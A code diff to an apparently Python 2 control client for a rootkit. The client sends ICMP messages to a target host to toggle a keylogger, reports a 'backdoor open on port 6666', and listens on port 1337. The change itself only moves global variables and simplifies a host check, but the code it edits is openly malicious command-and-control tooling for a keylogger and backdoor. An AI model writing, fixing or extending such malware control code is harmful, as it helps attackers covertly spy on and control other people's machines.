@@ -10,6 +10,9 @@ import getopt
 import random
 import asyncore
 
+code = 0
+host = ""
+
 ICMP_ECHO_REQUEST = 8
 ICMP_CODE = socket.getprotobyname('icmp')
 
@@ -76,7 +79,8 @@ def is_admin():
     if not os.geteuid()==0:
         sys.exit("\nYou must be root to run the application with this option, please use sudo and try again.\n")
 
-def is_host_set(host):
+def is_host_set():
+    global host
     if host == "": 
         sys.exit("\nAdd hostname as parameter.\n")  
 
@@ -93,15 +97,16 @@ def start_socket(port):
             print ""
 
 def signal_handler(signal, frame):
+    global host
     send_message(host, ROOTKIT_KEYLOGGER_DEACTIVATE);
     print "\nkeylogger deactivated"
     print "bye.."
     sys.exit(0)
 
-code = 0
-host = ""
+
 
 def main ():
+    global host, code
     options, remainder =  getopt.getopt(sys.argv[1:], 'a:d:h:u',[])
     if len(sys.argv) != 1:
     	listen=False
@@ -122,7 +127,7 @@ def main ():
                    print "backdoor open on port 6666"
 
     	is_admin()
-        is_host_set(host);
+        is_host_set();
     	send_message(host, code)
     	if listen:
     		start_socket(1337)
